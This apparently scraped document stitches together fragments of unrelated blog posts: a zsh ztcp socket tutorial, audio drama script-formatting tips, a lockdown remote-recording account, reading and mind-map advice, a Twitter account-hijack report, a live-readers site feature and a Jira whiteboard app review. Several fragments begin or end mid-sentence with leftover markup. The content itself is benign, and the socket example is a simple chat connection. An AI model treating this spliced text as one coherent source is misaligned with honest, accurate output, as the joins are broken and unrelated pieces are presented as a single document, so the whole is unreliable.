<h2 id="zsh">zsh</h2>
<p>zsh has an external module you can load in order to use itâ€™s socket capabilities. It doesnâ€™t support udp like bash, but itâ€™s more powerful in a few ways!</p>

<p>To load the module, put the following in your <code>.zshrc</code> or run it in your shell:</p>


<p>We now have access to the zsh networking builtin - <code>ztcp</code>!</p>

<p><code>ztcp</code> allows creating connections, like bash, but also allows listening for connections.</p>

<p>Straight from the zsh docs, we can create a connection between two machines with <code>ztcp</code>:</p>

<div><div><pre><code><span># host machine:</span>
ztcp <span>-l</span> 7128
<span>lfd</span><span>=</span><span>$REPLY</span>
ztcp <span>-a</span> <span>$lfd</span>
<span>talkfd</span><span>=</span><span>$REPLY</span>

<span># client machine</span>
ztcp HOST 7128
<span>talkfd</span><span>=</span><span>$REPLY</span>
</code></pre></div></div>

<p>The <code>$REPLY</code> variable here is a file descriptor returned by the last <code>ztcp</code> command, referring to the socket/connection it just created.</p>

<p>So, <code>talkfd</code> on both machines is a file descriptor for talking to the other:</p>
<div><div><pre><code><span># host machine</span>
<span>echo</span> <span>-e</span> <span>"hello!"</span> <span>&gt;</span>&amp;<span>$talkfd</span>

<span># client machine</span>
<span>read</span> <span>-r</span> line &lt;&amp;<span>$talkfd</span><span>;</span> print <span>-r</span> - <span>$line</span>
<span>&gt;</span> hello!
</code></pre></div></div>

<p>Again, thereâ€™s a lot more you can do, especially with the ability to listen for connections.</p>

<p>Hope this was as interesting to you as it was to me!</p>

Lines aren’t learned so it is vital that everyone is working from the same script, formatted in the same way. Believe me, a well formatted script can be worth it’s weight in gold. The easiest way for me to summarise why, is using the following breakdown.</p><h2>Best way to format an audio drama script</h2><div><p><strong>1 – Number the pages</strong>.</p><p><em>Sounds obvious I know, but you’d be amazed how many scripts we receive with no page numbers. Opinions differ on the best way to do this, but not long ago I found myself being playfully yelled at by the wonderfully eccentric actress&nbsp;<a href="https://en.wikipedia.org/wiki/Miriam_Margolyes" target="_blank" rel="noopener">Miriam Margolyes</a>. Her words echoed in my ears; “Who the hell do I have to f*ck to get the page numbers in the TOP RIGHT HAND CORNER OF THE PAGE?!!”. I sheepishly answered, “that would be me” and she went on to explain how much easier it is for actors to have it that way. I had always put the page numbers in the bottom right, but have since seen many actors clearly mark the page numbers in pen on the top right hand corner, leading me to believe that Ms. Margolyes is obviously correct and it makes those dreaded page turns considerably easier.</em></p></div><div><p><strong>2 – Number the lines.</strong></p><p><em>This is the killer. A good audio drama script needs to have each new cue numbered, starting&nbsp;from 1 on each new page. This is by far the most laborious part of the job (especially when you’re formatting a script which is 300+ pages). There is no programme which will do it for you – believe me, I have looked. Your best hope is that Word will recognise the pattern and make it a little easier as you go. It takes ages – but it’s very important for the entire process. In the studio it helps the director communicate with the actors “That was great, can we just redo lines 3 – 7 on page 444?”, meaning that people aren’t faffing around trying to find actual lines when you have precious little time in your £££-per-hour-studio. It also helps immeasurably with scheduling and editing.</em></p></div><div><p><strong>3 -Don’t split speeches over two pages</strong>.&nbsp;</p><p><em>To avoid the dreaded page turns during a take (or a pause as the ipad flicks up) don’t allow a speech to be split over a page. It’s best to have it all on one page, even if it means you leave a gap on the page before. This also helps the actor – no one wants to pause in the middle of a great speech to have to quietly turn a page. It kills the moment.</em></p></div><p><strong>4 – New scene, new page</strong>.&nbsp;</p><p><em>Yup, it makes the script longer and wastes paper, but it’s vital that new scenes start on a new page. It’s easier that way for all involved – for example, if you’re recording a very long (heavy) script, actors can just bring in their scenes easily without having half the scene before and after with them as well.</em></p><p><strong>5 – Mark SFX and Music cues clearly.</strong>&nbsp;</p><p><em>Sound effects cues don’t need to be numbered but they do need to be clearly marked so that the sound designer can skim through and locate their cues easily.</em></p><p><strong>6 – Differentiate&nbsp;narrator text.</strong>&nbsp;</p><p><em>Usually in bold, or italics. This means it’s easy to find if you record narration separately.</em></p><p><strong>7 – Use a clear, reasonably sized font</strong>.<em>&nbsp;</em></p><p><em>I prefer Arial, 12pt – but anything clear will do.&nbsp;</em></p><p><strong>8 -Descriptions or no description?</strong>&nbsp;</p><p><em>Recently, after sending out the below sample of audio formatting to a writer, he emailed back wondering; why, in audio drama, it is relevant to state ‘day’ or ‘night’? Of course, a writer doesn’t&nbsp;<strong>have</strong>&nbsp;to specify these things, but they shouldn’t be put off doing so simply because it’s audio drama. The world being created is as 3D and immersive as any other medium and the cast and crew need to be able to feel this.&nbsp;These aren’t just words on a page. In the below example, the scene is an&nbsp;amateur dramatics rehearsal of Romeo &amp; Juliet. The writer has specified it’s night time – but they’re inside and, with no visuals, is this necessary? Yes, it’s useful for the actors to help create their characters. Most of the characters have probably come to rehearse after work and aren’t getting paid, maybe they’re tired, maybe they’re hungry… I’d argue that well placed hints about the actors surroundings and environment are a huge help. Not to be mistaken, however, for lengthy descriptions of visual set design clearly left over from a lazily ‘adapted’ stage script.</em></p><p><strong>9 – List of characters</strong>.&nbsp;</p><p><em>This is something that I just prefer as it’s a huge help when casting if characters are listed, and even better with a short description including age. It’s a really handy reference.</em></p><div><figure><a href="http://blog.wirelesstheatre.co.uk/wp-content/uploads/2017/04/script-e1492597978203.jpg" target="_blank" rel="noopener"><img loading="lazy" width="266" height="270" src="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/script-e1492597978203.jpg" alt="How to Format an Audio Drama Script - Wireless Theatre"></a></figure></div><p>Below is a sample of audio drama script formatting. This is by no means gospel and many other companies may do it differently, and everyone must find what works for them. This is how we do it based on our experience of producing audio theatre and also of what seems to be most helpful to the actors and crew we work with.</p><h3><a href="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/WTL_Sample_Script2017.pdf">Wireless Theatre Sample Audio Script</a></h3><p>Writing an audio drama script is the start of a hugely exciting production process and over the last three years I have seen the online audio drama community grow and grow. It’s inspiring and&nbsp;thrilling to watch it develop and if this article in any way helps someone wanting to get into writing audio drama, then that is a gooooood thing.</p><p><strong>Mariele Runacre-Temple</strong>&nbsp;–&nbsp;<em>Producer, Audio Drama</em></p></div></div>]]>

It was early March 2020 and I had made a trip to London to get a guided tour of where I’d be working that summer: In a studio that was built for purpose – recording voices!</p></div><div><figure><img loading="lazy" width="400" height="532" src="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/Tshari-portrait.jpg" alt="Tshari King Sound Engineer Wireless Theatre Ltd" srcset="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/Tshari-portrait.jpg 400w, https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/Tshari-portrait-226x300.jpg 226w" sizes="(max-width: 400px) 100vw, 400px"><figcaption>Tshari King Sound Engineer</figcaption></figure></div><p>The Wireless Theatre Company&nbsp;has recorded many productions in very lovely professional studios but my own experience came from the company’s&nbsp;<a href="https://www.wirelesstheatrecompany.co.uk/recorded-live">live shows</a>. In the 10 or so years that I’ve worked with WTC, I’ve recorded audio dramas in theatres, large and small; conference rooms; huge live rooms designed for recording rock bands and ‘found spaces’ with ‘unique’ acoustics. It’s been a heady combination of fantastic fun and loads of hard work wedged into never-enough-hours. Over years of practice in many different venues, we’ve honed our skills and fine-tuned our productions into well-oiled machines. So perhaps I wasn’t destined to work in the cushy, temperature-controlled environment of the professional voice studio: Lockdown came into effect pretty much the day that I got home from London, the events industry suffered considerably from the outset, and, for a little while, all hope seemed lost. Then I got an email:&nbsp;<em>“We’re looking into the feasibility of recording remotely, do you think you’d be interested?”</em></p><div><p><strong>TAKING TEA IN THE SAME PARLOUR</strong></p><p>I was booked to record and edit the dialogue for a production which had been chosen for its good chances of remote recording success (no gigantic, space laser shooting, dragon fighting battles in mythical lands). The play is a period piece set in England, predominantly in the quiet of the countryside. The main obstacle I had to overcome was to take a group of actors who were spread out all over the country and get them to sound like they were all taking tea in the same parlour.</p><p><strong>RECORDING 101</strong></p></div><p>A professional recording studio should provide three things essential to making a quality recording:.<br></p><div><p>1.&nbsp; An acoustically-treated space,<br>2.&nbsp; High quality, professional equipment, and<br>3.&nbsp; Someone experienced in capturing the performance ‘magic’ at the highest quality possible.</p><p>In this instance I needed a cast of 19 actors to do all the work – the ‘studio’ was now in the homes of people who had spent their careers honing their acting skills, trusting the technical side to someone like me.&nbsp;My first task was to figure out how to get the best recordings out of everyone without being there myself. I wanted the process to be friendly, enjoyable and comfortable – acting is hard enough without having to divide your focus with processes that you don’t normally have to think about. While there is software that allows multiple people to record simultaneously via the internet, initial tests didn’t work out as stress-free as I’d hoped: there were barriers to getting the results needed, namely internet drop outs and issues with needing to connect so many people at the same time.&nbsp;.After further tests, my solution was to have everyone record themselves onto their own computer while using software designed for recording over the internet as a “virtual” studio where everyone could hear each other. I would record a “guide track” using a feed from the same software which would enable me to sync up everyone’s individual recordings once they’d sent them over to me at the end of the day. Easy!</p></div><p><strong>7 WARDROBES, SOME CUBBY HOLES AND A SHED</strong></p><p>Even after settling on how to record, I was worried that it would be a huge learning curve for everyone to essentially become a studio designer and recording engineer while delivering&nbsp;a convincing performance as an actor at the same time. As soon as casting was confirmed I sent an email to each cast member asking how they felt about using computers, whether they had recorded from home before, what their equipment was, and most importantly, asking for a sample recording.&nbsp;.</p><div><figure><a href="http://blog.wirelesstheatre.co.uk/wp-content/uploads/2020/09/Screen-Shot-2020-09-24-at-19.23.46.png" target="_blank" rel="noopener"><img src="https://blog.wirelesstheatre.co.uk/wp-content/uploads/2020/09/Screen-Shot-2020-09-24-at-19.23.46-300x175.png" alt="Remote Recording"></a><figcaption>Recording in Lockdown</figcaption></figure></div><div><p>I asked&nbsp;everyone to record the same piece of text, moving slightly further from their microphone with each verse. This allowed me to really hear the space they were in and see if it would work. When I had everyone’s recordings together in the same software, I could listen to each to try and match them up acoustically.&nbsp;.I was super impressed with the lengths that everyone had already gone in finding/creating a usable recording space. The wardrobe was the most popular (being the space with the highest density of fabric – highly important for making recordings with minimal sound reflections/echo) but we had some other interesting household locations such as; under the stairs, a cubby hole in the attic, a “den” made out of vintage bedding, a newly built homemade vocal booth in the corner of a room and, my personal favourite, a small shed built in the alcove of a large bedroom and “treated” inside and out with various soft furnishings.&nbsp;</p><p><strong>TRY TURNING IT OFF AND ON AGAIN</strong></p><p>Us humans have a tendency to find fear or anxiety in the unknown and working with unfamiliar technology is no exception:&nbsp;<em>“What happens if I press this button?”, “Is it supposed to do that?”.</em>&nbsp;As a ‘techie’, years of practice and learning that sometimes it’s okay to have leftover screws at the end of repair projects have given me the confidence to just press buttons and see what happens, smack things to make them work and boldly go beyond the warranty seal..Most of the cast had not had that experience and were wary of their newly- acquired audio responsibilities. I did whatever I could to ensure everyone was comfortable using the various equipment they had – I learnt my way around 2 new DAWs (Digital Audio Workstation, or computer recording software), refreshed my memory on 2 more, wrote 4 tutorials and had many hours of phone and video chats, plus loads of emails. Finally, we were ready to record!.</p><p><strong>GETTING IT RIGHT AT THE SOURCE</strong></p><p>We were lucky enough to be able to schedule in more days to record than we would have had in the studio and we needed them! It took me all of day one to figure out how to streamline the recording process (if there’s a better way to do this than by trial and error, please let me know) but from day two we were speeding along. Our director had thought of everything and managed it accordingly; the number of actors we could connect at any one time and keep the internet stable; upload breaks for sending files over to me so that it wouldn’t be a huge job at the end of the day; breaking up the script to keep things in the best order for recording.&nbsp;.</p></div><div><figure><img loading="lazy" width="400" height="406" src="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/making-a-podcast.jpg" alt="Mariele Runacre Temple Corona Cartoons Wireless Theatre Ltd" srcset="https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/making-a-podcast.jpg 400w, https://www.wirelesstheatrecompany.co.uk/wp-content/uploads/2020/10/making-a-podcast-296x300.jpg 296w" sizes="(max-width: 400px) 100vw, 400px"><figcaption>from ‘Corona Cartoons’ by Mariele Runacre Temple</figcaption></figure></div><p>In a studio recording, the engineer would typically stop recording between takes but, as the cast were recording themselves, I didn’t want the recording process to get in the way of performance, so I opted for just pressing record at the beginning of each scene and letting it roll, getting them to make a “snap” sound at the start of each recording which I would use to sync up the multiple recordings later. We co-ordinated record and stops together and soon everyone was bored of hearing me say “<em>we will record in…3,2,1, Recor</em>d”, my new catchphrase “stop and save!” with some added, “don’t forget to save!” thrown in at random intervals. From then on, all we had to contend with were internet dropouts, passing aircraft (civilian and military), lawnmowers, neighbours (hammering and shouting), occasional traffic, seagulls and pigeons; hardly perfect ambience for a period piece!&nbsp;<br></p><div><p>Once recording was finished for the day, I consolidated everyone’s individual audio recordings into something resembling what you would get from a regular studio recording. This meant syncing up everyone’s files in my software, checking that it had recorded properly at their end and placing markers for each scene and take. It took a couple of hours each evening, but saved me many hours when it came to the edit.&nbsp;.The editing process itself went pretty smoothly. After the edit, the audio is sent to the Sound Designer who breathes life into the production and it needs to sound it’s best before handing it over. I had to spend extra time compensating for the now very apparent lag caused by the internet connections: I trimmed gaps between almost every single line and removed any little noises that we missed during the recording sessions, from the tell- tale creak of someone shifting in their seat to distant traffic noise.</p><p><strong>THAT’S A WRAP</strong></p><p>Teams up and down the country and across the globe have had to find new ways of doing what they do (in our case,&nbsp;<a href="https://www.wirelesstheatrecompany.co.uk/home">create excellent audio</a>) in exceptional circumstances. The longer this goes on, the more it feels like these exceptional circumstances may become the norm, and I feel very honoured to be among the engineers who have ventured into this new way of working. Not to make it sound like I boldly strode in and ‘saved the day’ on this production; it was all very much a team effort and a learning curve for all of us. None of this would have happened without the tireless work of the amazing director and the WTC team. Ask us to do another one and we’ll be better and faster; another 5 and we’ll do better than a studio production!</p></div></div></div>]]>

Left side is responsible for logical reasoning and storing the information (text and keywords) and the right side is responsible for creativity and visual interpretations (coloring and visual positioning of the elements). Both things enhance our ability to remember things. Thus, a mind map is a must-use tool for everyone who wants to learn, or remember concepts easily.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/870/0*7xDdURIPArx_xeWr" width="435" height="435" srcset="https://miro.medium.com/max/552/0*7xDdURIPArx_xeWr 276w, https://miro.medium.com/max/870/0*7xDdURIPArx_xeWr 435w" sizes="435px" data-old-src="https://miro.medium.com/max/60/0*7xDdURIPArx_xeWr?q=20"></p></div></div></figure><p id="ef1d">I’m currently using Miro for that, but there are a few things I don’t like about it.</p><p id="a698">So creating a mindmap of a book or some concepts that it presents is a great way to actively work and interpret the information. I will be creating mindmaps for all kinds of concepts, including Effective Learning, Productivity, Love, Business, and more.</p><p id="0e87">Here’s an example of a <a href="https://miro.com/app/board/o9J_kg2KwH4=/" rel="noopener">mind map that I created for this topic</a></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/0*N7AwAdT3-ppgpXGo" width="1600" height="1061" srcset="https://miro.medium.com/max/552/0*N7AwAdT3-ppgpXGo 276w, https://miro.medium.com/max/1104/0*N7AwAdT3-ppgpXGo 552w, https://miro.medium.com/max/1280/0*N7AwAdT3-ppgpXGo 640w, https://miro.medium.com/max/1400/0*N7AwAdT3-ppgpXGo 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*N7AwAdT3-ppgpXGo?q=20"></p></div></div></div></figure><p id="18b7">We learn best when we are tested. Since many of us have already graduated from schools and universities, there’s no one to test us. So, we have to test ourselves.</p><p id="e452"><strong>Create a summary of each chapter</strong></p><p id="8cc8">To move the knowledge from short term memory into a long term understanding we should create concepts in our brain and try to interpret them. The best way to do that is to write down a summary for each chapter without looking back.</p><p id="9e3b"><strong>Create bullet points and test yourself</strong></p><p id="97ed">The notion allows one to create structures of notes in a way that it enables testing and active recall. For example, you can use Toggle lists that expand once you click on a toggle, so you don’t see the information at first and can test yourself.</p><p id="a790">Emerson advised to use your subconsciousness to maximize your ROI. That’s right, before you go to sleep, think about the topic and ask questions. I will be writing them down on a piece of paper. Once I wake up, the first thing to do is to write my dreams or thoughts down. We’ve seen how the world’s geniuses such as Tesla, Da Vinci, Mendeleev harvested this method. I think it might be worthwhile trying.</p><p id="221c">Just ask a question before going to sleep. It’s that simple.</p><p id="6330">Organizing repetition is crucial. The best way to repeat something is when you are learning more on this topic, or when you need these thoughts for actions on your business and or other decisions. That’s why Tagging is important, and I must create a system of tag and Notes. I’ve been hearing a lot about the <a href="https://en.wikipedia.org/wiki/Zettelkasten" rel="noopener">Zettelkasten</a> method of note taking, and I want to explore how it works. Zettelkasten basically allows cross linking of various notes and entities, so you can tag practically everything, and make those connections around topics you are exploring and learning.</p><p id="a13d">Another good ways to understand and remember material, — is to present it to someone. That’s why I will be writing blog posts, making live videos and speaking in front of audiences.</p><p id="fcef">Many people refer to Feyman technique that allows robust learning and transformation of short term memory into new mental models:</p><p id="6e87"><strong>Essentially, the Feynman Technique is this:</strong></p><ol><li id="6de0">Identify the subject. Write down everything you know about the topic.</li><li id="16b4"><strong>Teach</strong> it to a child. If you can <strong>teach</strong> a concept to a child, then you’re way ahead of the game.</li><li id="c9c9">Identify your <strong>knowledge</strong> gaps. This is the point where the real learning happens.</li><li id="3972">Organize + simplify + Tell a story.</li></ol><p id="a740">In a nutshell, here how I’m going to read</p><ol><li id="3af7"><strong>Have a clear ‘WHY” I’m reading this book</strong></li><li id="5e08"><strong>Review my previous notes and mind maps on topics that are going to be in the book</strong></li><li id="8884"><strong>Actively read the book</strong></li></ol><ul><li id="dd5e">Create mind maps</li><li id="dee2">Make notes and bullet points for each chapter</li><li id="c27b">Create quotes</li><li id="3543">Make side notes of topics to research</li><li id="c6ad">Try to tag everything through Zettelkasten method</li></ul><p id="f30f"><strong>4.

<p><strong>Status: 00:27 in the morning of December 4 my account was restored again.</strong> No words or explanations on how it happened – yet.</p>



<p>This morning (December 3rd, 2020) I woke up to find myself logged out from my Twitter account on the devices where I was previously logged in. Due to “suspicious activity” on my account. I don’t know the exact time this happened. I checked my phone at around 07:30 and then it has obviously already happened. So at time time over night.</p>



<p>Trying to log back in, I get prompted saying I need to update my password first. Trying that, it wants to send a confirmation email to an email address that isn’t mine! Someone has managed to modify the email address associated with my account.</p>



<p>It has only been two weeks since someone <a href="https://daniel.haxx.se/blog/2020/11/16/i-lost-my-twitter-account/" data-type="post" data-id="15196">hijacked my account</a> the last time and abused it for scams. When I got the account back, I made very sure I both set a good, long, password and activated 2FA on my account. 2FA with auth-app, not SMS.</p>



<p>The last time I wasn’t really sure about how good my account security was. This time I know I did it by the book. And yet this is what happened.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/12/Screenshot_2020-12-03-Losenordsaterstallning.png" alt="" width="467" height="328"><figcaption>Excuse the Swedish version, but it wasn’t my choice. Still, it shows the option to send the email confirmation to an email address that isn’t mine and I didn’t set it there.</figcaption></figure></div>



<h2>Communication</h2>



<p>I was in touch with someone at Twitter security and provided lots of details of my systems , software, IP address etc while they researched their end about what happened. I was totally transparent and gave them all info I had that could shed some light.</p>



<p>I was contacted by a Sr. Director from Twitter (late Dec 4 my time). We have a communication established and I’ve been promised more details and information at some point next week. Stay tuned.</p>



<h2>Was I breached?</h2>



<p>Many people have proposed that the attacker must have come through my local machine to pull this off. If someone did, it has been a very polished job as there is no trace at all of that left anywhere on my machine. Also, to reset my password I would imagine the attacker would need to somehow hijack my twitter session, need the 2FA or trigger a password reset and intercept the email. I don’t receive emails on my machine so the attacker would then have had to (also?) manage to get into my email machine and removed that email – and not too many others because I receive a lot of email and I’ve kept on receiving a lot of email during this period.</p>



<p>I’m not ruling it out. I’m just thinking it seems unlikely.</p>



<p>If the attacker would’ve breached my phone and installed something nefarious on that, it would not have removed any reset emails and it seems like a pretty touch challenge to hijack a “live” session from the Twitter client or get the 2FA code from the authenticator app. Not unthinkable either, just unlikely.</p>



<h2>Most likely?</h2>



<p>As I have no insights into the other end I cannot really say which way I think is the most likely that the perpetrator used for this attack, but I will maintain that I have no traces of a local attack or breach and I know of no malicious browser add-ons or twitter apps on my devices.</p>



<h2>Details</h2>



<p>Firefox version 83.0 on Debian Linux with Tweetdeck in a tab – a long-lived session started over a week ago (ie no recent 2FA codes used), </p>



<p>Browser extensions: Cisco Webex, Facebook container, multi-account containers, HTTPS Everywhere, test pilot and ublock origin.</p>



<p>I only use one “authorized app” with Twitter and that’s Tweetdeck.</p>



<p>On the Android phone, I run an updated Android with an auto-updated Twitter client. That session also started over a week ago. I used <em>Google Authenticator</em> for 2fa.</p>



<p>While this hijack took place I was asleep at home (I don’t know the exact time of it), on my WiFi, so all my most relevant machines would’ve been seen as originating from the same “NATed” IP address. This info was also relayed to Twitter security.</p>



<h2>Restored</h2>



<p>The actual restoration happens like this (and it was the exact same the last time): I just suddenly receive an email on how to reset my password for my account.</p>



<p>The email is a standard one without any specifics for this case. Just a template press the big button and it takes you to the Twitter site where I can set a new password for my account. There is nothing in the mail that indicates a human was involved in sending it. There is no text explaining what happened. Oh, right, the mail also include a bunch of standard security advice like “use a strong password”, “don’t share your password with others” and “activate two factor” etc as if I hadn’t done all that already…</p>



<p>It would be prudent of Twitter to explain how this happened, at least roughly and without revealing sensitive details. If it was my fault somehow, or if I just made it easier because of something in my end, I would really like to know so that I can do better in the future.</p>



<h2>What was done to it?</h2>



<p>No tweets were sent. The name and profile picture remained intact. I’ve not seen any DMs sent or received from while the account was “kidnapped”. Given this, it seems possible that the attacker actually only managed to change the associated account email address.</p>

        <small>2020-12-03</small>
        <p>This has been the most fun I’ve had with JavaScript in some time. A spiritual successor to the <a href="https://underjord.io/live-server-push-without-js.html">stupid solution</a> which allowed both me and my visitors to see the number of concurrent readers. It is also a piece of whimsy I’ve wanted to do for a while to add more magic and life to the site. The animations default to off to preserve CPU but do turn on the magic switch in the top right if you can and want to see the visuals. This is arguably less stupid.</p>
<p>What is it? Well, a live number of my readership for the entire site for one. If you turn on the magic you should also see the rough positions of other readers on the site that are on the same page as a small hovering geometric shape. I call them wisps.</p>
<p>It’s not often that you can see the footfalls of other people on the web unless they write a comment or something. I don’t want to expose my readers to one another in any privacy-sensitive way or in any fashion that requires moderation. This simply gives a rough indication of activity on the site and whether people are reading the same thing as you. And it moves around in fun ways.</p>
<p>Anyway, I enjoy it and I hope you will too. So how is this done? A small backend in Phoenix using Channels (basically just WebSockets), a small amount of Javascript to render new elements and update positions based on the state updates from the backend. The idle hovering of the symbols is CSS Animation and moving from area to area as the reader reads on is done via CSS Transitions.</p>
<p>I was hoping to default to on, but as I’ve found out with my sweet animated gradient lines, CSS aninmation can get CPU intensive. Right now my gradient lines pause after a period of inactivity and only run if there is activity. They hit 12% or so on my CPU which is dumb. A better fix to make them more lightweight is on the way, the idle-handling is a mitigation. So for these I wanted to avoid a big performance hit. They perform okay right now from my tests, they use the cheap-to-animate transforms so there’s nothing too heavy. But also, there’s not a known upper bound on the potential number of wisps active at the same time and if that scales poorly on some browsers I don’t want to default to setting someone’s phone on fire.</p>
<p>The number is available regardless since that doesn’t animate. I think showing this sort of thing is a fair way of both measuring concurrent visitors and sharing that with the visitor. I can see it, you can see it. I’ve also been considering a 90’s web visitor counter that is actually live. Could be fun. Just gotta find the right aesthetic.</p>
<p>I like this way of extending my site. I guess in a JAMStack fashion. The site is static but I can build small interactive parts and back them with minimal backends which for stateful applications Elixir does exceedingly well. If these backends go down the site will still work. All the important stuff is there. The fun stuff degrades to a connection error in the console.</p>
<p>Let me know how you like it, I do get and read responses to my posts and I appreciate when y’all reach out so try that via <a href="mailto:lars@underjord.io">lars@underjord.io</a> or @ me on Twitter <a href="https://twitter.com/lawik">@lawik</a>.

This week I am working with <a href="https://spartez-software.com/" target="_blank" rel="noreferrer noopener">Spartez</a> to review their new <a href="https://marketplace.atlassian.com/apps/1223211/whiteboards-for-jira-team-collaboration?hosting=cloud&amp;tab=overview" target="_blank" rel="noreferrer noopener">Whiteboards for Jira App</a>. And before you get worried – no, I have no intention of letting that change how I do reviews. I’ll go over the general idea of an app and give you some use cases. Then I’ll take a deeper dive into the feature set and end with my usual analysis – including how the App can be improved. And you can always find a way to enhance any App. I should note now, though, that the App is for Jira and Confluence Cloud only. But we’ll get to that in a bit.&nbsp;</p>



<p>Now, the world has had a crash course in working remotely. I had a bit of a head start, with me starting a remote job at the End of September ’19, versus most everyone’s February to March ’20. However, there is one thing that I’ve missed most. Sometimes it’s just easier to get someone into a meeting room with a markerboard and collaborate while drawing out the workflow, feature, automation, or what-have-you. There isn’t a good analog in the virtual space. A slack meeting comes close, but *not* quiet there, and both Zoom and Webex don’t even come close.</p>



<p>Fortunately, Spartez has been thinking the same thing. If you are not familiar with them, they are often known for Apps like Agile Poker and Agile Cards. To me, it seems they are always a go-to pick when you need to bridge the gap between the physical world and the digital one for your Agile practices. I’ve used both of the apps mentioned above before and have rarely had a problem with them.&nbsp;</p>



<p>However, they were facing a similar problem that most of us now face. How do we take some of the same practices we used to do in person together and take that online? One such challenge is Whiteboarding an idea out. And this was what Grzegorz Tańczyk was thinking about as he was preparing for Atlassian’s Codegeist 2020 hackathon.&nbsp;&nbsp;</p>



<p>This concept isn’t a new idea, however. There are several similar products already on the market, including Gliffy and Miro. However, the key to this is that it is Jira Cloud Native. This fact means it can import and change your issues already in Jira and create new content on your whiteboard.&nbsp;</p>



<p>When I saw the demo, I couldn’t help but think of all the potential use cases. There were the normal ones for sorting and updating issues. For example, you can set an “Update Issues” area to be a “Rank” Area and sort your issues there, and that new ranking will be updated on the Jira Issues. Or you can set an “Update Issues” Area to update the assignee so that any issues dragged there are assigned to that person.&nbsp;&nbsp;</p>

<p>However, the idea that captured me was the ability to add Images to it. Imagine this – you are on a UI/UX Team. You need some feedback on a new design change you are working on. So you set up a Webex/Zoom, so everyone can talk, and set up a Whiteboard with the new design on it. Then people can comment on various parts of it on the whiteboard – in real-time. And once a comment is settled on, you can directly convert those comments into Jira issues to be worked on.</p>



<figure><img data-attachment-id="2690" data-permalink="https://thejiraguy.com/image-5-16/" data-orig-file="https://thejiraguycom.files.wordpress.com/2020/12/image-5.png" data-orig-size="1583,800" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-5" data-image-description="" data-medium-file="https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=300" data-large-file="https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=1024" src="https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=1024" alt="" srcset="https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=1024 1024w, https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=150 150w, https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=300 300w, https://thejiraguycom.files.wordpress.com/2020/12/image-5.png?w=768 768w, https://thejiraguycom.files.wordpress.com/2020/12/image-5.png 1583w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>nothing to see here…</figcaption></figure>



<p>That’s the thing, though; this lets you collaborate in real-time. During the product demo, I was invited onto the board. So imagine, here I am in the US; meanwhile, the two people giving the demo for Spartez are in Poland. However, on the call, I could see the edits I was making show up on their board in real-time. That fact alone was amazing. And I didn’t even have to sign up to their Jira instance and take up a license!&nbsp;</p>



<p>So, let’s drill down into some features and see what this App can do.</p>







<h2>Collaborate concurrently with all your team members</h2>



<p>I’ve already touched on this – but this is the whole point. An in-person whiteboard is fantastic for collaboration. And this App is one of the closest experiences I’ve seen to that experience. This App allows you and your teammates, stakeholders, or any interested party to get together and work on an idea or task quickly, all while being aware of what is in Jira.</p>



<h2>Easily populate the whiteboard with existing Jira issues or create new ones.</h2>



<p>This concept, I think, is where this App excels against its competitors. To my knowledge, no other integration allows you to inject your Jira issues directly to the board to be a part of the experience.&nbsp;&nbsp;</p>



<figure><img data-attachment-id="2681" data-permalink="https://thejiraguy.com/image-2-17/" data-orig-file="https://thejiraguycom.files.wordpress.com/2020/12/image-2.png" data-orig-size="1647,850" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=300" data-large-file="https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=1024" src="https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=1024" alt="" srcset="https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=1024 1024w, https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=150 150w, https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=300 300w, https://thejiraguycom.files.wordpress.com/2020/12/image-2.png?w=768 768w, https://thejiraguycom.files.wordpress.com/2020/12/image-2.png 1647w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h2>Edit, update, rank, or transition Jira issues – individually, in a bulk, or via update zones.</h2>



<p>So, in the “before times,” one thing I liked about using whiteboards is it allowed you to organize information in a 2D space. Jira Agile Boards comes close, but they only allow you to manage along one axis.</p>



